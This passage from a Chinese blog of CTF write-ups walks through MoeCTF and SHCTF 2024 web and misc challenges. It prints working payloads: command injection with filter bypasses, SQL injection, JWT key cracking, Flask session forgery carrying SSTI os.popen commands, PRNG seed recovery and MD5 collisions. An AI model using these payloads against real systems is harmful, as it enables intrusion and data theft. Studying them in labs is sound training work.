href="https://quick-mascara-699.notion.site/2024SCTF-wp-d34600322f1141e680e837abce5795ef?pvs=74">https://quick-mascara-699.notion.site/2024SCTF-wp-d34600322f1141e680e837abce5795ef?pvs=74</a></p></blockquote><blockquote><p>最后想评价一下这次SCTF,难度是真的大，不是我这种菜鸡能接触的，索性跑路。[流泪]</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.10.19</title>
      <link href="/posts/c299aaba.html"/>
      <url>/posts/c299aaba.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h4 id="MoeCTF-2021-babyRCE">[MoeCTF 2021]babyRCE</h4><blockquote><p>考点：关键词过滤</p><p>来源：nssctf</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">$rce = $_GET[&#x27;rce&#x27;];</span><br><span class="line">if (isset($rce)) &#123;</span><br><span class="line">    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;, $rce)) &#123;</span><br><span class="line">        system($rce);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        echo &quot;hhhhhhacker!!!&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>先用ls查看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019170841483.png" alt="image-20241019170841483"></p><blockquote><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rce=ca\t$&#123;IFS&#125;fl\ag.php</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019170919138.png" alt="image-20241019170919138"></p><p><strong>注意：1.有时候使用cat会一片空白，需要查看源码</strong></p><p>​             <strong>2.允许的条件下，可以先用ls，再用cat</strong></p><h4 id="command-execution">command_execution</h4><blockquote><p>考点：命令执行</p><p>来源：攻防世界</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182142415.png" alt="image-20241019182142415"></p><blockquote><p>先ping一下127.0.0.1</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182650673.png" alt="image-20241019182650673"></p><blockquote><p>再用;来连接两个命令  127.0.0.1;ls</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182844520.png" alt="image-20241019182844520"></p><blockquote><p>试试看能不能查看inddex.php</p><p>127.0.0.1;cat index.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183259450.png" alt="image-20241019183259450"></p><blockquote><p>很明显，不行，那就退级看看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183409397.png" alt="image-20241019183409397"></p><blockquote><p>在home中发现flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183459124.png" alt="image-20241019183459124"></p><blockquote><p>查看flag</p><p>127.0.0.1;cat …/…/…/home/flag.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019173221179.png" alt="image-20241019173221179"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;ac541782e73fa1da4a98ec4bc3449fb1&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF-2024-week2-wp</title>
      <link href="/posts/8843d8f6.html"/>
      <url>/posts/8843d8f6.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="Week2-自助查询">[Week2]自助查询</h4><blockquote><p>考点：sql注入</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019091938307.png" alt="image-20241019091938307"></p><blockquote><p>看到查询语句,直接sql注入</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092125629.png" alt="image-20241019092125629"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092142856.png" alt="image-20241019092142856"></p><blockquote><p>说明只有两列</p></blockquote><blockquote><p>查看当前数据库</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092232840.png" alt="image-20241019092232840"></p><blockquote><p>查看’ctf’数据库下面的表</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092320620.png" alt="image-20241019092320620"></p><blockquote><p>查看’flag’下的字段</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092356472.png" alt="image-20241019092356472"></p><blockquote><p>查看’scretddata’的内容</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092506720.png" alt="image-20241019092506720"></p><blockquote><p>根据提示，说明在注释里面</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092616808.png" alt="image-20241019092616808"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092556163.png" alt="image-20241019092556163"></p><blockquote><p>找到flag</p><p>SHCTF{5elf_s3RvICe_SEARch_334c747eabdf}</p></blockquote><h4 id="Week2-登录验证">[Week2]登录验证</h4><blockquote><p>考点：jwt密钥爆破</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019094834915.png" alt="image-20241019094834915"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019094844778.png" alt="image-20241019094844778"></p><blockquote><p>爆破密码，是admin</p><p>抓包查看,发现有token</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019143840061.png" alt="image-20241019143840061"></p><blockquote><p>进行jwt密钥爆破，得到密钥为222333</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019143930858.png" alt="image-20241019143930858"></p><blockquote><p>使用密钥加密，把role改成admin，然后替换token发包就能拿到flag</p></blockquote><h4 id="Week2-入侵者禁入">[Week2]入侵者禁入</h4><blockquote><p>考点：session伪造+SSTI模板注入</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020151519980.png" alt="image-20241020151519980"></p><blockquote><p>分析这段代码，知道Flask的secret.key，想到Flask_session伪造</p><p>render_template_string()函数想到SSTI漏洞。</p></blockquote><blockquote><p>使用flask_session_cookie_manager工具构造payload</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -c &quot;eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZvZ8IQ.B9Q1a7gFQvzs4Q3bGldXuiGHULg&quot; -s &quot;0day_joker&quot;</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s &quot;0day_joker&quot; -t &quot;&#123;&#x27;role&#x27;: &#123;&#x27;flag&#x27;: &#x27;&#123;&#123;lipsum.globals[&quot;os&quot;].popen(&quot;ls&quot;).read()&#125;&#125;&#x27;, &#x27;is_admin&#x27;: 1&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s &quot;0day_joker&quot; -t &quot;&#123;&#x27;role&#x27;: &#123;&#x27;flag&#x27;: &#x27;&#123;&#123;lipsum.globals[&quot;os&quot;].popen(&quot;ls /&quot;).read()&#125;&#125;&#x27;, &#x27;is_admin&#x27;: 1&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s &quot;0day_joker&quot; -t &quot;&#123;&#x27;role&#x27;: &#123;&#x27;flag&#x27;: &#x27;&#123;&#123;lipsum.globals[&quot;os&quot;].popen(&quot;cat /flag&quot;).read()&#125;&#125;&#x27;, &#x27;is_admin&#x27;: 1&#125;&#125;&quot;</span><br></pre></td></tr></table></figure><blockquote><p>修改session就能拿到flag。</p></blockquote><h4 id="Week2-guess-the-number">[Week2]guess_the_number</h4><blockquote><p>考点：随机数</p><p>在伪随机数生成器（PRNG）中，一个种子并不只生成一个随机数。相反，它生成的是一个伪随机数序列。每次调用 <code>random.randint()</code> 或其他类似方法时，伪随机数生成器会根据当前的内部状态生成下一个随机数。因此，给定相同的种子，可以生成一系列相同的随机数</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020153007442.png" alt="image-20241020153007442"></p><blockquote><p>访问 /s0urce下载源码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import random</span><br><span class="line">from flask import Flask, request, render_template, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;, first_num = first_num)  </span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/s0urce&#x27;)</span><br><span class="line">def get_source():</span><br><span class="line">    file_path = &quot;app.py&quot;</span><br><span class="line">    return send_file(file_path, as_attachment=True)</span><br><span class="line">    </span><br><span class="line">@app.route(&#x27;/first&#x27;)</span><br><span class="line">def get_first_number():</span><br><span class="line">    return str(first_num)</span><br><span class="line">    </span><br><span class="line">@app.route(&#x27;/guess&#x27;)</span><br><span class="line">def verify_seed():</span><br><span class="line">    num = request.args.get(&#x27;num&#x27;)</span><br><span class="line">    if num == str(second_num):</span><br><span class="line">        with open(&quot;/flag&quot;, &quot;r&quot;) as file:</span><br><span class="line">            return file.read()</span><br><span class="line">    return &quot;nonono&quot;</span><br><span class="line"> </span><br><span class="line">def init():</span><br><span class="line">    global seed, first_num, second_num</span><br><span class="line">    seed = random.randint(1000000,9999999)</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    first_num = random.randint(1000000000,9999999999)</span><br><span class="line">    second_num = random.randint(1000000000,9999999999)</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">app.run(debug=True)</span><br></pre></td></tr></table></figure><blockquote><p>分析可知，生成一个随机数，让我们预测下一个随机数。</p></blockquote><p><strong>在伪随机数生成器（PRNG）中，一个种子并不只生成一个随机数。相反，它生成的是一个伪随机数序列。每次调用 <code>random.randint()</code> 或其他类似方法时，伪随机数生成器会根据当前的内部状态生成下一个随机数。因此，给定相同的种子，可以生成一系列相同的随机数</strong></p><blockquote><p>所以可以使用脚本找到种子，然后就能预测下一个随机数</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line"># 已知的 first_num</span><br><span class="line">known_first_num = 6296819177</span><br><span class="line"></span><br><span class="line"># 定义种子的范围</span><br><span class="line">seed_min = 1000000</span><br><span class="line">seed_max = 9999999</span><br><span class="line"></span><br><span class="line">def find_seed(known_first_num, seed_min, seed_max):</span><br><span class="line">    for seed in range(seed_min, seed_max + 1):</span><br><span class="line">        # 用当前种子设置随机数生成器</span><br><span class="line">        random.seed(seed)</span><br><span class="line">        </span><br><span class="line">        # 生成一个随机数</span><br><span class="line">        first_num = random.randint(1000000000, 9999999999)</span><br><span class="line">        </span><br><span class="line">        # 检查生成的随机数是否与已知的相同</span><br><span class="line">        if first_num == known_first_num:</span><br><span class="line">            print(f&quot;找到了种子: &#123;seed&#125;&quot;)</span><br><span class="line">            return seed</span><br><span class="line"></span><br><span class="line">    print(&quot;未找到匹配的种子&quot;)</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"># 调用函数查找种子</span><br><span class="line">found_seed = find_seed(known_first_num, seed_min, seed_max)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020154220638.png" alt="image-20241020154220638"></p><blockquote><p>根据找到的种子找出下一个随机数</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020153812776.png" alt="image-20241020153812776"></p><blockquote><p>输入拿到flag</p><p>SHCTF{th1s_Num8eR_is_EaSy_Gu3Ss_29c737b0d2ae}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF 2024 week1 wp</title>
      <link href="/posts/d49b7347.html"/>
      <url>/posts/d49b7347.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="Misc">Misc</h2><h4 id="Week1-真真假假-遮遮掩掩">[Week1]真真假假?遮遮掩掩!</h4><blockquote><p>考点：压缩包伪加密，掩码爆破</p></blockquote><blockquote><p>下载附件有一个压缩包，打开发现需要密码，放进010查看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013141600023.png" alt="image-20241013141600023"></p><blockquote><p>伪加密，直接修改</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013141917529.png" alt="image-20241013141917529"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142232902.png" alt="image-20241013142232902"></p><blockquote><p>根据提示，想到是掩码爆破</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142333945.png" alt="image-20241013142333945"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142450917.png" alt="image-20241013142450917"></p><blockquote><p>SHCTF{C0ngr@tu1at1ons_On_Mast3r1ng_mAsk_aTT@ck5!}</p></blockquote><h4 id="Week1-拜师之旅①">[Week1]拜师之旅①</h4><blockquote><p>考点：损坏文件，png隐写</p></blockquote><blockquote><p>下载压缩包解压，有个损坏的图片，放进010查看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013143047137.png" alt="image-20241013143047137"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013143303185.png" alt="image-20241013143303185"></p><blockquote><p>缺少png文件头部，补上复原</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013143555983.png" alt="image-20241013143555983"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013143544675.png" alt="image-20241013143544675"></p><blockquote><p>修改高度，得到flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013143704633.png" alt="image-20241013143704633"></p><h4 id="Week1-Rasterizing-Traffic">[Week1]Rasterizing Traffic</h4><blockquote><p>考点：流量分析，光栅图解析</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013144705416.png" alt="image-20241013144705416"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013144858845.png" alt="image-20241013144858845"></p><p>经过分析，发现png图片，直接查看或导出来（显示分组字节或导出分组字节流）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013145053272.png" alt="image-20241013145053272"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013145146704.png" alt="image-20241013145146704"></p><blockquote><p>光栅图，使用工具<a href="https://github.com/AabyssZG/Raster-Terminator">AabyssZG/Raster-Terminator: CTF之光栅图秒杀器 (github.com)</a></p></blockquote><blockquote><p>下载下来后需要将第75行的三维数组改为二维，这题才能用</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3427126-20241009075341628-713750445.png" alt="img"></p><blockquote><p>输入命令 python <a href="http://Raster-Terminator.py">Raster-Terminator.py</a> -x 1.png</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013144509352.png" alt="image-20241013144509352"></p><blockquote><p>得到光栅图，连在一起就是flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013144543461.png" alt="image-20241013144543461"></p><h4 id="Week1-有WiFi干嘛不用呢？">[Week1]有WiFi干嘛不用呢？</h4><blockquote><p>考点：wifi密码爆破</p></blockquote><blockquote><p>用脚本将may文件夹的数据提取出来</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./* &gt; test.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013150141334.png" alt="image-20241013150141334"></p><blockquote><p>删除[]，用aircrack-ng爆破</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013150439262.png" alt="image-20241013150439262"></p><blockquote><p>找到wifi密码</p><p>SHCTF{0TUMVxz0JrUSDxHG}</p></blockquote><h2 id="web">web</h2><h4 id="Week1-单身十八年的手速">[Week1] 单身十八年的手速</h4><blockquote><p>考点：查看源代码</p></blockquote><blockquote><p>打开网页</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142707618.png" alt="image-20241013142707618"></p><blockquote><p>查看源代码，找到.js文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142800638.png" alt="image-20241013142800638"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142816921.png" alt="image-20241013142816921"></p><blockquote><p>发现一串base64字符</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U0hDVEZ7OWY0NTM2NzItNTJlNS00N2NlLTg4OWEtMDEyYzkwMDczYmUxfQo=</span><br></pre></td></tr></table></figure><blockquote><p>解码得到flag</p><p>SHCTF{9f453672-52e5-47ce-889a-012c90073be1}</p></blockquote><h4 id="Week1-MD5-Master">[Week1] MD5 Master</h4><blockquote><p>考点：md5碰撞，md5长度拓展攻击</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line">$master = &quot;MD5 master!&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&quot;master1&quot;]) &amp;&amp; isset($_POST[&quot;master2&quot;]))&#123;</span><br><span class="line">    if($master.$_POST[&quot;master1&quot;] !== $master.$_POST[&quot;master2&quot;] &amp;&amp; md5($master.$_POST[&quot;master1&quot;]) === md5($master.$_POST[&quot;master2&quot;]))&#123;</span><br><span class="line">        echo $master . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo file_get_contents(&#x27;/flag&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&quot;master? &lt;br&gt;&quot;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>需要找到前缀都是$master但不相同，而他们的md5值又相同的值。</p></blockquote><blockquote><p>先用fastcoll找出这两个值。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013154012749.png" alt="image-20241013154012749"></p><blockquote><p>使用脚本post上传，得到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013154120766.png" alt="image-20241013154120766"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import binascii</span><br><span class="line"> </span><br><span class="line">def read_binary_file_as_hex(file_path):</span><br><span class="line">    with open(file_path, &#x27;rb&#x27;) as binary_file:</span><br><span class="line">        binary_data = binary_file.read()</span><br><span class="line">        hex_data = binascii.hexlify(binary_data).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    return hex_data</span><br><span class="line"> </span><br><span class="line">file_1 = &#x27;C:\\CTF\\WEB\\WEB\\webtools\\fastcoll.exe\\1.bin&#x27;</span><br><span class="line">file_2 = &#x27;C:\\CTF\\WEB\\WEB\\webtools\\fastcoll.exe\\2.bin&#x27;</span><br><span class="line">hex_data_1 = read_binary_file_as_hex(file_1)</span><br><span class="line">hex_data_1 = hex_data_1[22:]</span><br><span class="line">hex_data_2 = read_binary_file_as_hex(file_2)</span><br><span class="line">hex_data_2 = hex_data_2[22:]</span><br><span class="line">print(hex_data_1)</span><br><span class="line">print(hex_data_2)</span><br><span class="line">print(type(hex_data_1))</span><br><span class="line"> </span><br><span class="line">binary_data_1 = bytes.fromhex(hex_data_1)</span><br><span class="line">binary_data_2 = bytes.fromhex(hex_data_2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = &#x27;http://210.44.150.15:25738/&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;master1&#x27;: binary_data_1,</span><br><span class="line">    &#x27;master2&#x27;: binary_data_2</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"> </span><br><span class="line">print(response.status_code)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><blockquote><p>SHCTF{e0b338e9-b826-462b-af82-efce41ef53e9}</p></blockquote><h4 id="Week1-ez-gittt">[Week1] ez_gittt</h4><blockquote><p>考点：git泄露</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013162613667.png" alt="image-20241013162613667"></p><blockquote><p>查看源码，明确git泄露</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013162650245.png" alt="image-20241013162650245"></p><blockquote><p>拉取git到本地查看</p></blockquote><p><strong><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013162726079.png" alt="image-20241013162726079"></strong></p><blockquote><p>看到增加flag，查看详情，找到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013162812675.png" alt="image-20241013162812675"></p><blockquote><p>SHCTF{6ad1f777-d0cf-41c1-8197-7feb7641e165}</p></blockquote><h4 id="Week1-jvav">[Week1] jvav</h4><blockquote><p>考点：java</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013163210821.png" alt="image-20241013163210821"></p><blockquote><p>不懂 java，但是 gpt 会帮我写代码：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"> </span><br><span class="line">public class demo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String filePath = &quot;/flag&quot;;  // 本地文件路径</span><br><span class="line">        BufferedReader reader = null;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            reader = new BufferedReader(new FileReader(filePath));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">                System.out.println(line);  // 输出每一行内容</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            System.out.println(&quot;文件读取错误: &quot; + e.getMessage());</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (reader != null) &#123;</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                System.out.println(&quot;关闭文件时出错: &quot; + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>得到flag</p><p>SHCTF{055ac047-4421-4f0d-902a-8d4f72a585ad}</p></blockquote><h4 id="Week1-poppopop">[Week1] poppopop</h4><blockquote><p>考点:序列化反序列化</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class SH &#123;</span><br><span class="line"></span><br><span class="line">    public static $Web = false;</span><br><span class="line">    public static $SHCTF = false;</span><br><span class="line">&#125;</span><br><span class="line">class C &#123;</span><br><span class="line">    public $p;</span><br><span class="line"></span><br><span class="line">    public function flag()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;p)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class T&#123;</span><br><span class="line"></span><br><span class="line">    public $n;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        SH::$Web = true;</span><br><span class="line">        echo $this-&gt;n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class F &#123;</span><br><span class="line">    public $o;</span><br><span 